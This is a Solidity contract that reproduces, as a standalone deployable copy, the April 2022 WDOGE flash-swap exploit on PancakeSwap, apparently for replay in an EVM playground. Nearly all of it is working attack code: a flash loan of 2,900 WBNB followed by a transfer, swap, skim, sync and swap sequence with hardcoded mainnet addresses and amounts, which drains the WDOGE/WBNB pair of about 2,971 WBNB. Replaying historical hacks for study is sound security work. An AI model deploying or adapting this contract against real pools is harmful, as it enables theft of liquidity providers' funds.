// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Wdoge).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// flash-swap callback `pancakeCall` lives on the test itself, so there is no
// standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + pancakeCall) so the playground can
// deploy it and record run(). Logic and constants are copied verbatim from
// test/Wdoge_exp.sol.
//
// Root cause: WDOGE's transfer accounting left the WDOGE/WBNB Pancake pair's
// reserves inconsistent with actual balances, so a sequence of
// transfer→swap→transfer→skim→sync→swap extracted ~2,971 WBNB from the pair.

interface IWBNB {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

contract WdogeDrain {
    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant wdoge = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
    address constant WDOGE_WBNB = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
    address constant BUSDT_WBNB = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    // step 0: trigger a flash swap from the WBNB/BUSDT pair; the callback does the drain.
    function run() external {
        IPancakePair(BUSDT_WBNB).swap(0, 2900 ether, address(this), "0x");
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // 1. donate the flash-borrowed WBNB to the WDOGE/WBNB pair, then swap it for a huge WDOGE payout.
        wbnb.transfer(WDOGE_WBNB, 2900 ether);
        IPancakePair(WDOGE_WBNB).swap(6_638_066_501_837_822_413_045_167_240_755, 0, address(this), "");

        // 2. push WDOGE back, skim the excess, and re-sync — the pair's reserves no longer match balances.
        wdoge.transfer(WDOGE_WBNB, 5_532_718_068_557_297_916_520_398_869_451);
        IPancakePair(WDOGE_WBNB).skim(address(this));
        IPancakePair(WDOGE_WBNB).sync();

        // 3. push WDOGE again and swap it for an over-large WBNB payout.
        wdoge.transfer(WDOGE_WBNB, 4_466_647_961_091_568_568_393_910_837_883);
        IPancakePair(WDOGE_WBNB).swap(0, 2_978_658_352_619_485_704_640, address(this), "");

        // 4. repay the 2,900 WBNB flash (plus an 8 WBNB premium); the surplus stays here.
        wbnb.transfer(BUSDT_WBNB, 2908 ether);
    }
}
